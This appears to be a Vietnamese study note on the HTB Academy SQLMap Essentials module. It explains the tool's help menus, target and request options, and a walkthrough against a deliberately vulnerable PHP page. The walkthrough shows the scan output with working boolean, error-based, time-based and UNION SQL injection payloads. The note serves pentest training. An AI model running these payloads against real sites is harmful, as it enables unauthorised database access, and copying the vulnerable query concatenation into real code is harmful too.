# Bắt Đầu Với SQLMap (Getting Started with SQLMap)

> **HTB Academy Module 58: SQLMap Essentials - Section 2 / 11**  
> *Đường dẫn bài học: `01-getting-started/02-getting-started-with-sqlmap.md`*

---

## 1. Hệ Thống Trợ Giúp Của SQLMap (Help Messages)

Khi bắt đầu sử dụng SQLMap, giao diện dòng lệnh cung cấp hai cấp độ trợ giúp (Help Menu) tùy theo nhu cầu tra cứu:

### 1.1. Trợ Giúp Cơ Bản (Basic Help - `-h`)
Hiển thị các tùy chọn và cờ (switches) thông dụng nhất, đủ dùng cho 90% các tình huống pentest cơ bản:
```bash
sqlmap -h
```

```console
shellsession BreakHerHeart@htb[/htb]$ sqlmap -h
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.9#stable}
|_ -| . ["]     | .'| . |
|___|_   [.]_|_|_|__,|  _|
      |_|...            |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs
...SNIP...
```

### 1.2. Trợ Giúp Nâng Cao Toàn Diện (Advanced Help - `-hh`)
Hiển thị toàn bộ tất cả các tham số, công tắc cấu hình chi tiết từ kết nối, request, injection, tamper scripts đến OS takeover:
```bash
sqlmap -hh
```

```console
shellsession BreakHerHeart@htb[/htb]$ sqlmap -hh
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.9#stable}
|_ -| . [.]     | .'| . |
|___|_   [)]_|_|_|__,|  _|
      |_|...            |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -d DIRECT           Connection string for direct database connection
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
    -g GOOGLEDORK       Process Google dork results as target URLs
    -c CONFIGFILE       Load options from a configuration INI file

  Request:
    These options can be used to specify how to connect to the target URL

    -A AGENT, --user..  HTTP User-Agent header value
    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --param-del=PARA..  Character used for splitting parameter values (e.g. &)
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
...SNIP...
```

> [!NOTE]
> Để tìm hiểu chi tiết từng ngóc ngách kỹ thuật, bạn nên tham khảo tài liệu hướng dẫn chính thức tại [SQLMap GitHub Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

---

## 2. Các Tùy Chọn Xác Định Mục Tiêu (Target Options)

Trước khi thực thi, SQLMap bắt buộc phải được cung cấp ít nhất một phương thức xác định mục tiêu (`Target`):

| Cờ (Flag) | Ý Nghĩa Kỹ Thuật | Trường Hợp Sử Dụng Điển Hình |
| :--- | :--- | :--- |
| **`-u <URL>`** | Chỉ định URL mục tiêu trực tiếp. | Kiểm thử nhanh tham số GET trên đường link (ví dụ: `http://site.com/view.php?id=1`). |
| **`-r <FILE>`** | Nạp toàn bộ raw HTTP Request từ tệp tin. | **Phương pháp chuẩn nhất trong thực chiến**: Lưu request từ Burp Suite ra file `.req` rồi truyền vào SQLMap. Hỗ trợ tự động cả POST, Cookie, Headers phức tạp. |
| **`-l <LOGFILE>`** | Phân tích file log từ Burp Suite hoặc WebScarab. | Tự động quét hàng loạt request đã đi qua proxy. |
| **`-m <BULKFILE>`**| Đọc danh sách nhiều URL từ file text. | Quét hàng loạt URL mục tiêu (Bulk scanning). |
| **`-g <DORK>`** | Xử lý kết quả tìm kiếm Google Dork. | Tìm kiếm và kiểm thử hàng loạt trang web có chung mẫu dork trên mạng. |
| **`-d <CONN_STR>`**| Kết nối trực tiếp vào DBMS qua cổng database. | Kiểm thử đặc quyền khi đã có credential kết nối trực tiếp database (bỏ qua web server). |

---

## 3. Các Tùy Chọn Tùy Biến HTTP Request

Trong môi trường thực tế, ứng dụng web thường yêu cầu xác thực phiên đăng nhập (Session/Cookie) hoặc các HTTP Headers đặc biệt:

* **`--data="id=1&name=admin"`**: Ép SQLMap gửi dữ liệu qua phương thức **POST** thay vì GET.
* **`--cookie="PHPSESSID=...; security=low"`**: Cung cấp Cookie xác thực phiên đăng nhập (rất quan trọng khi kiểm thử sau khi đã đăng nhập).
* **`-A / --user-agent="<UA>"`**: Giả lập trình duyệt (Chrome, Firefox, Mobile) tránh bị chặn bởi bộ lọc cơ bản.
* **`-H "<Header>"`**: Bổ sung header tùy biến (ví dụ: `-H "X-Forwarded-For: 127.0.0.1"` hoặc `-H "Authorization: Bearer <TOKEN>"`).
* **`--method=PUT`**: Ép buộc sử dụng phương thức HTTP cụ thể (PUT, DELETE, PATCH).

---

## 4. Kịch Bản Khai Thác Cơ Bản (Basic Scenario Walkthrough)

### 4.1. Phân Tích Mã Nguồn Lỗ Hổng Phía Máy Chủ (Vulnerable PHP Code)
Xem xét đoạn mã PHP phía backend của trang web `http://www.example.com/vuln.php?id=1`:

```php
$link = mysqli_connect($host, $username, $password, $database, 3306);

// LỖ HỔNG: Nối chuỗi trực tiếp từ tham số $_GET["id"] mà không qua hàm lọc/escape
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);

// BẬT ERROR REPORTING: In trực tiếp lỗi database ra màn hình khi câu truy vấn hỏng
if (!$result) die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

**Nhận xét lỗ hổng**:
1. Lập trình viên ghép trực tiếp `$_GET["id"]` vào câu lệnh SQL mà không sử dụng **Prepared Statements (Parameterized Queries)**.
2. Hàm `die(mysqli_error($link))` in trực tiếp lỗi của database ra giao diện web khi truy vấn bị lỗi cú pháp $\rightarrow$ Giúp kẻ tấn công lập tức xác nhận sự tồn tại của lỗ hổng thông qua kỹ thuật **Error-based SQLi**.

---

### 4.2. Khai Thác Bằng SQLMap Với Tham Số `--batch`

Khi kiểm thử URL này bằng SQLMap:
```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

> [!IMPORTANT]
> **Ý nghĩa của cờ `--batch`**:  
> Bình thường trong quá trình quét, SQLMap sẽ liên tục dừng lại để hỏi ý kiến người dùng bằng các câu hỏi tương tác (ví dụ: *"Có muốn bỏ qua các payload của DBMS khác không? [Y/n]"*, *"Có muốn tiếp tục quét tham số khác không? [y/N]"*).  
> Cờ **`--batch`** sẽ tự động chọn câu trả lời mặc định được khuyến nghị (default option), giúp quy trình kiểm thử diễn ra hoàn toàn tự động từ đầu đến cuối mà không cần can thiệp bàn phím.

---

### 4.3. Phân Tích Chi Tiết Đầu Ra Quá Trình Quét Của SQLMap

```console
shellsession BreakHerHeart@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.9}
|_ -| . [,]     | .'| . |
|___|_   [(]_|_|_|__,|  _|
      |_|...            |_|   http://sqlmap.org

[*] starting @ 22:26:45 /2020-09-09/

[22:26:45] [INFO] testing connection to the target URL
[22:26:45] [INFO] testing if the target URL content is stable
[22:26:46] [INFO] target URL content is stable
[22:26:46] [INFO] testing if GET parameter 'id' is dynamic
[22:26:46] [INFO] GET parameter 'id' appears to be dynamic
[22:26:46] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[22:26:46] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[22:26:46] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[22:26:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:26:46] [WARNING] reflective value(s) found and filtering out
[22:26:46] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")
[22:26:46] [INFO] testing 'Generic inline queries'
[22:26:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[22:26:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
...SNIP...
[22:26:46] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[22:26:46] [INFO] testing 'MySQL inline queries'
[22:26:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[22:26:46] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)
...SNIP...
[22:26:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:26:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[22:26:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:26:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:26:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:26:56] [INFO] target URL appears to have 3 columns in query
[22:26:56] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
```

#### Bảng Tóm Tắt Kết Quả Phát Hiện (Injection Points Summary):
Cuối quá trình quét, SQLMap tổng kết lại tất cả các phương thức khai thác thành công đối với tham số `id`:

```text
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8814=8814

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
---
[22:26:56] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 5.0
[22:26:57] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'
[*] ending @ 22:26:57 /2020-09-09/
```

#### Thông Tin Tình Báo Thu Thao Được:
1. **Tham số bị tiêm**: `id` qua phương thức `GET`.
2. **Kỹ thuật thành công**: Cả 4 kỹ thuật chính (`Boolean-based`, `Error-based`, `Time-based`, `UNION query`) đều khai thác được.
3. **Số cột trong câu lệnh SELECT**: Xác định được chính xác câu truy vấn có **3 cột** (`3 columns in query`).
4. **Công nghệ mục tiêu**:
   * Web Server: **Apache 2.2.9**
   * Ngôn ngữ Backend: **PHP 5.2.6**
   * Hệ quản trị CSDL (DBMS): **MySQL >= 5.0**
5. **Vị trí lưu trữ phiên quét**: Toàn bộ log và dữ liệu khai thác được lưu tự động tại thư mục:
   `~/.sqlmap/output/www.example.com/`

---

## 5. Checkpoint & Điểm Cần Nhớ (Key Takeaways)

1. Luôn dùng **`-h`** để xem nhanh lệnh cơ bản, **`-hh`** khi cần tra cứu các kỹ thuật nâng cao.
2. Cờ **`-u`** dùng để truyền đường dẫn URL mục tiêu.
3. Luôn gắn cờ **`--batch`** trong các kịch bản tự động hóa hoặc khi không muốn bị gián đoạn bởi các câu hỏi chọn `[Y/n]` của SQLMap.
4. Mọi dữ liệu thu thập được từ mục tiêu đều được SQLMap tự động tổ chức và lưu trữ trên ổ đĩa tại thư mục ẩn `~/.sqlmap/output/<target_domain>/`.

---
*Edit by me and AI.*
